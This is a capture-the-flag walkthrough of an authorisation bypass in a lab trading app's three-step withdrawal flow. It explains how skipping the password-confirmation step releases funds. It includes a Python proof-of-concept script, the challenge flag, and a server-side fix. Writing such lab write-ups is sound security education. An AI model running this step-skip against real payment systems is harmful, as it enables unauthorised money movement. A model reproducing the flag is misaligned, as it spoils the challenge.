# shadyoaks-008 - BugForge Daily Walkthrough

**Difficulty:** Easy (Daily)
**Vulnerability:** Broken state machine on a multi-step withdrawal flow - the mandatory
password-confirmation step can be skipped, releasing an unauthorised payout.
**Flag:** `bug{3ARXTEmCIaGHBY35HZncsGAsbh8TXEhU}`
**Hint:** "Multi-step sequences are always buggy."

---

## Summary

Shady Oaks Financial is a React SPA over an Express/JWT/SQLite stock-trading backend. This
instance shipped a new "withdraw to bank" (payout) feature implemented as a 3-step sequence:

1. `POST /api/payouts {amount, iban}` -> status `initiated`
2. `POST /api/payouts/:id/confirm {password}` -> status `confirmed` (re-authenticates with the
   account password before the money can move)
3. `POST /api/payouts/:id/release {}` -> status `released` (balance is debited, transfer "sent")

The `release` handler only checks that the payout exists and is not already released. It never
checks that the payout is in the `confirmed` state. An `initiated` payout can therefore be
released directly, skipping the password-authorisation step (step 2) entirely. The server treats
that unauthorised release as a compliance-relevant event and returns the flag in a
`compliance_reference` field on the response.

---

## Tech Stack

- React SPA (CRA), Express.js, JWT (localStorage), SQLite
- New feature vs. prior shadyoaks variants: multi-step payout/withdrawal flow
  (`/api/payouts`, `/api/payouts/:id/confirm`, `/api/payouts/:id/release`)

---

## Discovery

The daily was re-shipped mid-day (the first drop went out with the template UI, not the updated
backend). After a fresh instance was started, the hint read **"Multi-step sequences are always
buggy."** Diffing the updated JS bundle against the earlier one showed two brand-new endpoints:

```
> "/api/payouts"
> "/api/payouts/"
```

Reading the bundle's payout component revealed the three-call sequence (initiate / confirm /
release) and its intended order. "Multi-step sequence" + a state machine with a security-relevant
middle step (password confirm) is the textbook setup for a step-skip / broken-state-transition
bug.

---

## The bug

Walking the flow legitimately shows the balance is debited only at `release`, and `confirm`
requires the account password:

```
initiate 100 -> status initiated, balance 1000
confirm      -> status confirmed, balance 1000   (password required)
release      -> status released,  balance 900
```

The `release` transition validates only "exists" and "not already released" - not "is
confirmed". Skipping step 2 works:

```
POST /api/payouts        {amount:100, iban:...}   -> {id:2, status:"initiated"}
POST /api/payouts/2/release {}                     -> {id:2, status:"released", amount:100,
                                                       compliance_reference:"bug{...}"}
```

Releasing an `initiated` (never-confirmed) payout succeeds and the response carries the flag.

Related transitions that are correctly defended (so they are not the bug):
- initiate with `amount > balance` -> `400 Insufficient balance`
- double `release` of the same payout -> `400 This withdrawal has already been released`

---

## Exploit

```python
import json, urllib.request, random, string
BASE = "<instance-url>"; PW = "TestPass123!"
def req(m,p,d=None,t=None):
    b=json.dumps(d).encode() if d is not None else None
    h={"Content-Type":"application/json"}; 
    if t:h["Authorization"]="Bearer "+t
    import urllib.error
    r=urllib.request.Request(BASE+p,data=b,method=m,headers=h)
    try:
        with urllib.request.urlopen(r,timeout=15) as x: return json.loads(x.read() or b"{}")
    except urllib.error.HTTPError as e: return json.loads(e.read())

u="poc_"+''.join(random.choices(string.ascii_lowercase,k=8))
tok=req("POST","/api/register",{"username":u,"email":u+"@test.local","password":PW})["token"]
pid=req("POST","/api/payouts",{"amount":100,"iban":"DE89370400440532013000"},tok)["id"]
print(req("POST",f"/api/payouts/{pid}/release",{},tok)["compliance_reference"])
```

See `payout_release_bypass.py` (in the lab dir) for the full PoC. Proven live during the solve;
the returned `compliance_reference` was the flag.

---

## Impact

Any authenticated user can complete a bank withdrawal without ever passing the password
re-authorisation step that the flow is designed to require. In a real system this defeats the
step-up/authorisation control on money movement (an attacker with only a stolen session, not the
password, could still push funds out).

## Fix

Enforce the state transition server-side: `release` must reject any payout whose status is not
exactly `confirmed`.

```js
if (payout.status !== 'confirmed')
  return res.status(409).json({ error: 'Withdrawal must be confirmed before release' });
```
